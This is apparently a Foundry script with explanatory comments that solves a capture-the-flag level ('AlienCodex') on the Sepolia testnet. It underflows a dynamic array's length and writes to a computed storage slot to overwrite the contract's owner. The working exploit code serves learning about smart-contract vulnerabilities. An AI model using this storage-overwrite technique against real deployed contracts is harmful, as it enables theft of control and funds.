// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level19AlienCodex.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: Claim ownership to complete the level.

/*
    In Solidity version 0.5.0, array underflow can occur because arithmetic operations on unsigned integers (like uint256) 
    do not automatically revert on underflow/overflow. 
    This means if you decrement a uint256 variable that is already zero, it wraps around to the maximum value (2**256 - 1).
    How does this apply to dynamic arrays?
    A dynamic array's length is stored as a uint256. If you call a function like pop() or a custom function that decrements the array length 
    when the array is empty (length is zero), the length will underflow to 2**256 - 1. This makes the array appear to have the maximum possible length.
    Why is this a problem?
    With an underflowed array, you can write to any storage slot in the contract by using a large enough index. 
    This is a classic storage collision vulnerability, allowing you to overwrite critical variables (like owner).

   Storage Layout of AlienCodex contract:
    slot 0: owner (20 bytes), contact (1 byte)
    slot 1: length of codex (32 bytes)

    h = keccak256(1)
    slot h:     codex[0]
    slot h + 1: codex[1]
    slot h + 2: codex[2]
    slot h + 3: codex[3]

    slot h + 2**256 - 1: codex[2**256 - 1]

    find such i that
    slot h + i = slot 0 (to overwrite owner)
    h + i = 0
    i = 0 - h
*/

contract Level19Solution is Script {
    IAlienCodex public alien =
        IAlienCodex(0xFd45d4F39D2fb0decF7d88EC0E4dB0be2fe13f6e);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Current owner:", address(alien.owner()));
        alien.makeContact();
        alien.retract(); // Underflows the codex array to allow manipulation
        uint256 h = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 i;
        unchecked {
            i = 0 - h;
        }
        alien.revise(i, bytes32(uint256(uint160(vm.envUint("MY_ADDRESS")))));
        console.log("New owner:", address(alien.owner()));

        vm.stopBroadcast();
    }
}
// forge script script/Level19Solution.s.sol:Level19Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
